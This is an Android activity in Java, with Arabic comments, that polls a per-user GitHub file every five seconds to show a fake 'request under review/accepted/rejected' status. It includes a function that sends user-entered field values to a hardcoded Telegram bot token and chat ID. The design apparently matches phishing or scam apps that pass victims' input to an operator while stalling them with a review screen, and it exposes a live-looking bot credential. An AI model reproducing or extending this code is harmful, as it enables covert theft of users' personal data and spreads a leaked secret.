package com.ban.ab;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private TextView statusTitle, statusDescription;
    private ProgressBar loadingBar;
    private String userName;
    private final OkHttpClient client = new OkHttpClient();
    private final Handler handler = new Handler();
    private Runnable refreshRunnable;

    // --- إعدادات التحكم (يجب تعديلها) ---
    private final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/abdullah14120/ban/refs/heads/main/commands/";
    private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String CHAT_ID = "1749638488";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        // جلب اسم المستخدم المحفوظ
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        userName = pref.getString("user_name", "unknown");

        statusTitle = findViewById(R.id.statusTitle);
        statusDescription = findViewById(R.id.statusDescription);
        loadingBar = findViewById(R.id.loadingBar);

        // بدء مراقبة الأوامر كل 5 ثوانٍ
        startAutoRefresh();
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                checkRemoteCommand();
                handler.postDelayed(this, 5000); // تكرار كل 5 ثوانٍ
            }
        };
        handler.post(refreshRunnable);
    }

    private void checkRemoteCommand() {
        // رابط الملف الفردي للمستخدم
        String fileUrl = GITHUB_RAW_URL + userName + ".json";

        Request request = new Request.Builder().url(fileUrl).build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        String jsonData = response.body().string();
                        JSONObject json = new JSONObject(jsonData);
                        String status = json.getString("status");

                        runOnUiThread(() -> handleStatus(status, json));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    private void handleStatus(String status, JSONObject json) {
        try {
            switch (status) {
                case "waiting":
                    statusTitle.setText("طلبك قيد المراجعة");
                    loadingBar.setVisibility(View.VISIBLE);
                    break;

                case "rejected":
                    loadingBar.setVisibility(View.GONE);
                    statusTitle.setText("نأسف، تم رفض طلبك");
                    statusTitle.setTextColor(getResources().getColor(android.R.color.holo_red_dark));
                    statusDescription.setText(json.optString("reject_reason", "لأسباب أمنية"));
                    break;

                case "accepted":
                    loadingBar.setVisibility(View.GONE);
                    statusTitle.setText("تم قبول طلبك ✅");
                    statusDescription.setText("يمكنك الآن البدء باستخدام ميزات النظام.");
                    break;
                
                // يمكنك إضافة حالات أخرى هنا (مثل إظهار الحقول)
            }
        } catch (Exception e) {}
    }

    // دالة إرسال محتوى الحقول لتليجرام
    private void sendFieldToTelegram(String fieldName, String value) {
        String message = "تحديث من المستخدم: " + userName + "\n" + fieldName + ": " + value;
        RequestBody formBody = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", message)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(formBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {}
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    runOnUiThread(() -> Toast.makeText(SecondActivity.this, "تم التأكيد", Toast.LENGTH_SHORT).show());
                }
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(refreshRunnable); // إيقاف الفحص عند إغلاق التطبيق
    }
}
